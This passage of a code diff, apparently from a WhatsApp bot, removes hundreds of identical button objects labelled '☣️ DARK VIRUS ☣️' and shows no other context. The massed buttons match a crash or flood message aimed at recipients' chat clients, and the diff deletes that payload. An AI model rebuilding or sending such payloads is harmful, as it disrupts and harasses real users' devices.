-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
-              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
